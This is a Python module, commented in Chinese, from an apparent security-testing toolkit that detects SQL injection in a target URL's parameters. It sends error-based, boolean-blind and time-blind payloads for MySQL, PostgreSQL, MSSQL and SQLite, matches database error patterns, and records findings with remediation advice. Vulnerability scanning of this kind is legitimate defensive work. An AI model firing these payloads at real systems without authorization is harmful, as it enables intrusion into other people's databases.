"""SQL 注入检测器"""
import re
import time
import urllib.parse
from typing import List
from secops_core.http_client import http_get
from secops_core.config import ATTACK_DELAY
from secops_offense.attack_engine.finding import Finding
from secops_offense.attack_engine.auth import log_audit
from secops_offense.attack_engine.modules.base import BaseDetector


class SQLiDetector(BaseDetector):
    """SQL 注入检测器"""

    name = "sqli"
    category = "SQLi"

    ERROR_PATTERNS = [
        (r"SQL syntax.*MySQL", "MySQL"),
        (r"Warning.*mysql_", "MySQL"),
        (r"valid MySQL result", "MySQL"),
        (r"MySqlClient\.", "MySQL"),
        (r"PostgreSQL.*ERROR", "PostgreSQL"),
        (r"Warning.*\Wpg_", "PostgreSQL"),
        (r"Npgsql\.", "PostgreSQL"),
        (r"ORA-[0-9]{4}", "Oracle"),
        (r"Oracle error", "Oracle"),
        (r"Driver.* SQL[\-\_\ ]*Server", "MSSQL"),
        (r"OLE DB.* SQL Server", "MSSQL"),
        (r"Microsoft Access Driver", "Access"),
        (r"JET Database Engine", "Access"),
        (r"SQLite/JDBCDriver", "SQLite"),
        (r"SQLite\.Exception", "SQLite"),
        (r"\[SQLITE_ERROR\]", "SQLite"),
        (r"SQLSTATE\[", "PDO/通用"),
        (r"You have an error in your SQL", "MySQL"),
        (r"Unclosed quotation mark", "MSSQL"),
        (r"syntax error at or near", "PostgreSQL"),
        (r"pg_query\(\)", "PostgreSQL"),
        (r"mysql_fetch", "MySQL"),
    ]

    ERROR_PAYLOADS = [
        "'", "\"",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "1' ORDER BY 100--",
        "1 UNION SELECT NULL--",
        "' AND 1=CONVERT(int, (SELECT @@version))--",
        "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version)))--",
        "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "1'; SELECT SLEEP(5)--",
        "1' OR SLEEP(5)--",
    ]

    TIME_PAYLOADS = [
        ("MySQL", "' OR SLEEP({delay})--", 5),
        ("MySQL", "1' AND SLEEP({delay})--", 5),
        ("MySQL", "'; SELECT SLEEP({delay}); --", 5),
        ("MySQL", "1 AND (SELECT * FROM (SELECT(SLEEP({delay})))a)", 5),
        ("PostgreSQL", "'; SELECT pg_sleep({delay}); --", 5),
        ("MSSQL", "'; WAITFOR DELAY '0:0:{delay}'; --", 5),
        ("SQLite", "' AND 1=randomblob(500000000)--", 3),
    ]

    def test(self, target_url: str, params: list = None,
             time_based: bool = True, boolean_based: bool = True) -> List[Finding]:
        findings = []

        parsed = urllib.parse.urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        if params is None:
            if parsed.query:
                params = list(urllib.parse.parse_qs(parsed.query).keys())
            else:
                params = ["id", "page", "user", "uid", "cat", "type",
                          "order", "sort", "limit", "offset", "item"]

        # 基线响应时间
        _, _, baseline_body = http_get(target_url)
        baseline_times = []
        for _ in range(3):
            t0 = time.time()
            http_get(target_url)
            baseline_times.append(time.time() - t0)
            time.sleep(0.1)
        avg_baseline = sum(baseline_times) / len(baseline_times) if baseline_times else 0

        for param in params:
            # ---- 报错型注入 ----
            for payload in self.ERROR_PAYLOADS:
                test_params = {param: payload}
                test_url = f"{base_url}?{urllib.parse.urlencode(test_params)}"

                log_audit("SQLi_ERROR", test_url, f"param={param}")
                status, headers, body = http_get(test_url)

                if status == 0:
                    continue

                for pattern, db_type in self.ERROR_PATTERNS:
                    match = re.search(pattern, body, re.IGNORECASE)
                    if match:
                        findings.append(Finding(
                            vuln_type="SQLi", severity="critical",
                            title=f"报错型 SQL 注入 ({db_type}) - 参数 {param}",
                            location=test_url, payload=payload,
                            evidence=f"数据库报错: {match.group()[:200]}",
                            description=f"参数 {param} 存在 {db_type} SQL 注入漏洞。",
                            remediation="使用参数化查询(PreparedStatement)，禁止字符串拼接SQL"
                        ))
                        break

                if any(f.vuln_type == "SQLi" and param in f.title for f in findings):
                    break
                time.sleep(ATTACK_DELAY)

            # ---- 布尔盲注 ----
            if boolean_based and not any("SQLi" in f.title and param in f.title for f in findings):
                true_params = {param: "1 AND 1=1"}
                false_params = {param: "1 AND 1=2"}

                _, _, true_body = http_get(f"{base_url}?{urllib.parse.urlencode(true_params)}")
                time.sleep(0.15)
                _, _, false_body = http_get(f"{base_url}?{urllib.parse.urlencode(false_params)}")

                if true_body and false_body and len(true_body) != len(false_body):
                    diff = abs(len(true_body) - len(false_body))
                    if diff > 50:
                        findings.append(Finding(
                            vuln_type="SQLi", severity="critical",
                            title=f"布尔盲注 SQL 注入 - 参数 {param}",
                            location=base_url,
                            payload="1 AND 1=1 vs 1 AND 1=2",
                            evidence=f"真条件响应 {len(true_body)} bytes, 假条件响应 {len(false_body)} bytes, 差异 {diff} bytes",
                            description=f"参数 {param} 存在布尔盲注漏洞。",
                            remediation="使用参数化查询"
                        ))

            # ---- 时间盲注 ----
            if time_based and not any("SQLi" in f.title and param in f.title for f in findings):
                for db_name, payload_tpl, delay in self.TIME_PAYLOADS:
                    payload = payload_tpl.format(delay=delay)
                    test_params = {param: payload}
                    test_url = f"{base_url}?{urllib.parse.urlencode(test_params)}"

                    log_audit("SQLi_TIME", test_url, f"param={param}, db={db_name}")

                    t0 = time.time()
                    status, _, _ = http_get(test_url, timeout=delay + 5)
                    elapsed = time.time() - t0

                    if elapsed > (avg_baseline + delay - 1.5):
                        # 二次确证
                        t0 = time.time()
                        http_get(test_url, timeout=delay + 5)
                        elapsed2 = time.time() - t0

                        if elapsed2 > (avg_baseline + delay - 1.5):
                            findings.append(Finding(
                                vuln_type="SQLi", severity="critical",
                                title=f"时间盲注 SQL 注入 ({db_name}) - 参数 {param}",
                                location=test_url, payload=payload,
                                evidence=f"基线 {avg_baseline:.2f}s, 触发 {elapsed:.2f}s / {elapsed2:.2f}s",
                                description=f"参数 {param} 存在 {db_name} 时间盲注漏洞。",
                                remediation="使用参数化查询"
                            ))
                            break

                    time.sleep(ATTACK_DELAY)

        return findings
